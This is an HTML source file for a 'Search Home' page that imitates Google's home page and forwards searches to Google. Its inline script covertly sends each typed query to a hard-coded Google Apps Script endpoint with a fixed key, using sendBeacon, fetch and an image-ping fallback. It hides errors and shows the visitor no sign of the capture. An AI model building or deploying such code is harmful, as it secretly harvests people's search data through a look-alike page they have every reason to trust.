<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="color-scheme" content="light dark" />
  <title>Search Home</title>
  <style>
    :root {
      --bg:#ffffff;--text:#1f1f1f;--muted:#5f6368;--link:#1a73e8;
      --surface:#f6f7f8;--footer:#eef1f1;--shadow:0 1px 6px rgba(0,0,0,.12);
      --input-bg:#fff;--input-border:#dadce0;--icon:#9aa0a6;
      --btn-bg:#eef1f1;--btn-text:#272626;--signin-bg:#0f63c1;--signin-text:#fff;
      --r-xl:999px;--r-md:10px;--sp1:8px;--sp2:12px;--sp3:16px;--maxc:min(680px,96vw);
    }
    html[data-theme="dark"] {
      --bg:#0f1115;--text:#e3e3e3;--muted:#b9bcbf;--link:#8ab4f8;
      --surface:#161a20;--footer:#14171c;--shadow:0 1px 10px rgba(0,0,0,.5);
      --input-bg:#0f131a;--input-border:#2a2f36;--icon:#a8adb3;
      --btn-bg:#1f2530;--btn-text:#e6e6e6;--signin-bg:#1a73e8;--signin-text:#fff;
    }
    *,*::before,*::after{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;display:flex;flex-direction:column;background:var(--bg);color:var(--text);
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased}
    a{color:var(--link);text-decoration:none}
    .container{display:flex;flex-direction:column;min-height:100%}
    .header{display:flex;align-items:center;justify-content:space-between;gap:var(--sp2);padding:var(--sp2)var(--sp3)}
    .header .left,.header .right{display:flex;align-items:center;gap:var(--sp2)}
    .app-dots{display:grid;grid-template-columns:repeat(3,6px);grid-gap:3px;padding:6px;border-radius:8px;background:transparent}
    .app-dots i{width:6px;height:6px;border-radius:50%;background:var(--icon);display:block}
    .sign-in{background:var(--signin-bg);color:var(--signin-text);border:0;border-radius:var(--r-xl);
      padding:10px 14px;font-size:16px;line-height:1;cursor:pointer;min-height:44px}
    .content{display:grid;place-items:center;padding:clamp(12px,4vw,32px);gap:var(--sp3);flex:1}
    .wordmark{font-weight:700;font-size:clamp(24px,9vw,52px);letter-spacing:-0.02em;margin-bottom:6px;color:var(--text)}
    .search-box{position:relative;width:100%;max-width:var(--maxc)}
    .icon{color:var(--icon);position:absolute;top:50%;transform:translateY(-50%);font-size:22px;pointer-events:none}
    .icon.left{left:14px}
    .icon.right{right:14px}
    #search-input{width:100%;height:52px;border-radius:var(--r-xl);border:1px solid var(--input-border);
      outline:none;padding:0 46px;background:var(--input-bg);color:var(--text);box-shadow:var(--shadow);font-size:16px}
    .search-button{margin:14px 0;display:flex;gap:var(--sp2);justify-content:center;flex-wrap:wrap}
    .btn-search,.btn-feeling-lucky{background:var(--btn-bg);color:var(--btn-text);border:1px solid var(--input-border);
      border-radius:var(--r-md);min-width:44vw;max-width:320px;height:48px;cursor:pointer;padding:0 var(--sp3);
      font-size:16px;line-height:1;min-height:44px}
    .footer{margin-top:auto;background:var(--footer);color:var(--text)}
    .footer-content{display:flex;justify-content:center;gap:clamp(10px,4vw,24px);padding:var(--sp2)var(--sp3);flex-wrap:wrap}
    @media(min-width:560px){.btn-search,.btn-feeling-lucky{min-width:160px;width:180px}}
  </style>

  <script>
    // YOUR deployed Apps Script URL + key (update here if needed)
    const ENDPOINT = 'https://script.google.com/macros/s/AKfycbysIg2Id12QYLkxYWg_hxfAQwsiNuiK3GzVWHqIL_F8zZo6obOU5ht0OPI5SwHqzn2i/exec';
    const API_KEY  = 'magic-key-2025';

    function sendToBackend(q){
      const params = new URLSearchParams({ q, key: API_KEY });

      // 1) sendBeacon (best during navigation)
      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
          navigator.sendBeacon(ENDPOINT, blob);
        } else {
          fetch(ENDPOINT, { method:'POST', body: params, keepalive:true, mode:'cors' }).catch(()=>{});
        }
      } catch(e){}

      // 2) GET fallback via image ping
      try {
        const img = new Image();
        img.src = ENDPOINT + '?' + params.toString();
      } catch(e){}
    }

    window.addEventListener('DOMContentLoaded',()=>{
      const form=document.getElementById('search-form');
      const input=document.getElementById('search-input');
      const lucky=document.getElementById('btn-lucky');

      form?.addEventListener('submit',()=>{
        const q=(input.value||'').trim();
        try{ localStorage.setItem('lastSearch', q); }catch(e){}
        if(q) sendToBackend(q);
        // no preventDefault â€” leave navigation to browser to perform the real search
      });

      lucky?.addEventListener('click',()=>{
        const q=(input.value||'').trim();
        try{ localStorage.setItem('lastSearch', q); }catch(e){}
        if(q) sendToBackend(q);
        window.location.href='https://www.google.com/search?btnI=I&q='+encodeURIComponent(q);
      });
    });
  </script>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="left">
        <div class="app-dots" title="Apps">
          <div style="display:grid;grid-template-columns:repeat(3,6px);grid-gap:3px">
            <i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i>
          </div>
        </div>
      </div>
      <div class="right">
        <a href="https://mail.google.com">Gmail</a>
        <a href="https://www.google.com/imghp?hl=en">Images</a>
        <button class="sign-in"><a href="https://accounts.google.com/ServiceLogin">Sign in</a></button>
      </div>
    </div>

    <div class="content">
      <div class="wordmark">Search Home</div>

      <div class="search-box">
        <form id="search-form" action="https://www.google.com/search" method="GET">
          <svg class="icon left" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.71.71l.27.28v.79L20 21.5 21.5 20l-6-6zm-6 0a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
          <svg class="icon right" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 14a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v5a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 14 0h-2zM11 19h2v3h-2z"/></svg>
          <input type="search" id="search-input" name="q" placeholder="Search" autocomplete="off" />
        </form>
      </div>

      <div class="search-button">
        <button class="btn-search" type="submit" form="search-form">Search</button>
        <button class="btn-feeling-lucky" id="btn-lucky" type="button">I'm Feeling Lucky</button>
      </div>
    </div>

    <div class="footer">
      <div class="footer-content">
        <a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Settings</a>
      </div>
    </div>
  </div>
</body>
</html>

